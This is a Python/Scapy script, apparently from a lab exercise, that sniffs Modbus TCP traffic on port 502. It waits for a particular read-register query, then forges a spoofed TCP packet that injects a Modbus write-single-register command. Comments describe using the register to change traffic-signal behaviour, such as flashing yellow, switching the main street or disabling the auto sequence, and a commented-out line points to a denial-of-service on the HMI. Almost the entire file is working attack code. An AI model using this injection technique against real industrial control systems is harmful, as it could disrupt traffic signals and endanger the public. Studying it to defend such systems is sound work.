from scapy.all import *

print("Capturando paquetes Modbus en la interfaz lo")
flag = True
while flag:
    Modbus_frames = sniff(iface="lo", filter="tcp port 502", count=2)
    READ_REGISTER_QUERY = Modbus_frames[0]
    READ_REGISTER_ACK = Modbus_frames[1]

    if Raw in READ_REGISTER_QUERY:
        modbus_data = READ_REGISTER_QUERY[TCP].load
        if modbus_data[8:].hex() == "0001001103000000":
            print("Paquete detectado")
            flag = False


print("PACKET CRAFTING TIME")
payload_size = len(READ_REGISTER_QUERY[TCP].payload) +28
print("seq number: ", READ_REGISTER_ACK[TCP].seq)

tcpdata = {
	'src': READ_REGISTER_ACK[IP].src,
	'dst': READ_REGISTER_ACK[IP].dst,
	'sport': READ_REGISTER_ACK[TCP].sport,
	'dport': READ_REGISTER_ACK[TCP].dport,
	'seq': READ_REGISTER_ACK[TCP].seq +16 , #these numbers are subject to change, based off the offset within the communication with a known length of
	'ack': READ_REGISTER_ACK[TCP].ack +12,	#the previous packet sent within the TCP stream
	'wnd': READ_REGISTER_ACK[TCP].window
	}

payload = IP(src=tcpdata['dst'], dst=tcpdata['src']) / \
	TCP(sport=tcpdata['dport'], dport=tcpdata['sport'], flags="PA",
	window=tcpdata['wnd'], seq=tcpdata['seq'], ack=tcpdata['ack'])



class ModbusTCP(Packet):
	name = "ModbusTcp"
	fields_desc = [ ShortField("Transaction_Identifier", 1337), # Transaction ID is customized to show direct results, other variables are known goods
			ShortField("Protocol_Identifier", 0),
			ShortField("Length", 6),
			ByteField("Unit_Identifier", 1)
			]

class ModbusSet(Packet):
	name = "Modbus"
	fields_desc = [ XByteField("Function_Code", 6), #REQUIRED TO WRITE TO SINGLE REGISTER, SEE FUNCTION CODES FOR MORE INFORMATION
			ShortField("Reference_Number", 1), #Customizable to create different results (Flashing yellow, change from side to main street, disable auto sequence, etc.)
			ShortField("Data", 1)
			]



payload = payload/ModbusTCP()/ModbusSet()

print("INJECTION TIME")
send(payload, verbose=0, iface='lo')



print("PACKET ACK CRAFTING TIME")
tcpdata = {
    'src': READ_REGISTER_ACK[IP].dst,
    'dst': READ_REGISTER_ACK[IP].src,
    'sport': READ_REGISTER_ACK[TCP].dport,
    'dport': READ_REGISTER_ACK[TCP].sport,
    'seq': READ_REGISTER_ACK[TCP].ack,
    'ack': READ_REGISTER_ACK[TCP].seq + payload_size,
    'wnd': READ_REGISTER_ACK[TCP].window
}

# Construir el paquete ACK
ack_packet = IP(src=tcpdata['src'], dst=tcpdata['dst']) / \
             TCP(sport=tcpdata['sport'], dport=tcpdata['dport'], flags="A",
                 window=tcpdata['wnd'], seq=tcpdata['seq'], ack=tcpdata['ack'])

#time.sleep(0.5)
#send(ack_packet, verbose=0, iface='lo')


print("AND THAT\'S ALL FOLKS")
payload.display()

#resetPayload = payload/ModbusTCP()/ModbusReset()
#send(resetPayload, verbose=0, iface='eth0') this should not be uncommented, but kept in final beta to introduce the idea of a DoS attack on the HMI